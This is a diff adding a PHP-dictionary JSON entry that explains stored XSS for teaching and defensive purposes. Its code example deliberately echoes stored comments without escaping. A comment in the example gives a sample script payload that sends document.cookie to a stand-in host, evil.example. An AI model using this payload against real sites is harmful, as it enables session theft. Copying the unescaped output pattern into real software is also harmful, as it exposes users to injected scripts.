@@ -1,0 +1,52 @@
+{
+    "id": "stored-xss",
+    "name": "Stored XSS",
+    "url": "https://php-dictionary.readthedocs.io/en/latest/index/stored-xss.html",
+    "aliases": [
+        "persistent-xss"
+    ],
+    "description": "Stored XSS, also called persistent XSS, is a variant of ``XSS`` where the malicious payload is saved on the server, in a database, a comment field, a log, or any other storage the application later reads back, instead of being reflected immediately from the current request.\n\nBecause the payload is persisted, every user who later views the page containing it executes the attacker's script, with no need to click a crafted link or visit a special URL, unlike reflected XSS. This also makes stored XSS more dangerous: a single injection can affect every visitor, including administrators.\n\nStored XSS commonly slips through when a team treats the database as an implicitly trusted source, sanitizing or validating data only on the way in, and then trusting it enough to skip output encoding on the way out. The database itself provides no protection: encoding must still be applied at the point where the stored value is written into HTML, JavaScript, or another output context.",
+    "code": "<?php\n\n    // Write path: attacker submits a malicious comment.\n    $body = $_POST['comment']; // e.g. '<script>document.location=\"//evil.example/?c=\"+document.cookie</script>'\n    $pdo->prepare('INSERT INTO comments (body) VALUES (?)')->execute([$body]);\n\n    // Read path, later, for every visitor: raw output re-executes the payload.\n    foreach ($pdo->query('SELECT body FROM comments') as $comment) {\n        echo $comment['body']; // vulnerable: should be htmlspecialchars($comment['body'])\n    }\n\n?>",
+    "documentation": "https://owasp.org/www-community/Types_of_Cross-Site_Scripting",
+    "related": [
+        "xss",
+        "escape-html",
+        "sanitation",
+        "htmlpurifier",
+        "taint",
+        "database",
+        "write-context"
+    ],
+    "citations": [
+        {
+            "@type": "CreativeWork",
+            "name": "Documentation",
+            "url": "https://owasp.org/www-community/Types_of_Cross-Site_Scripting"
+        },
+        {
+            "@type": "CreativeWork",
+            "name": "Stored XSS",
+            "url": "https://portswigger.net/web-security/cross-site-scripting/stored"
+        }
+    ],
+    "tags": [
+        "security",
+        "vulnerability"
+    ],
+    "packagist": [],
+    "extensions": [],
+    "analyzers": [],
+    "cobblers": [],
+    "rule": "",
+    "phpVersionSince": "",
+    "phpVersionUntil": "",
+    "phpVersionDeprecated": "",
+    "phpErrors": [
+        ""
+    ],
+    "changedBehavior": "",
+    "author": "",
+    "brand": "",
+    "popularity": "",
+    "modified": "Wed, 05 Aug 2026 08:12:40 +0000"
+}
